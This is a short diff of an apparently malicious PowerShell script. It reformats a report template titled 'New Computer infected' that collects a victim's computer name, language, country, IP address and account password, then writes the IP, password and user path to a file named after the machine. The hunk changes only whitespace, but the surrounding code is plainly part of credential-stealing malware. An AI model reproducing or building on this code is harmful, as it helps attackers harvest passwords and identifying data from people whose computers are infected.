@@ -63,11 +63,11 @@ $description =
 "
 New Computer infected 
 ---------------------------------
-Computer Name = $env:computername 
-Computer Language = $language
-Location (country) = $country
-IP = $ip
-Account Password = $pword
+Computer Name =       $env:computername 
+Computer Language =   $language
+Location (country) =  $country
+IP =                  $ip
+Account Password =    $pword
 "
 New-Item ./$env:computername.fk -Value (
   $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
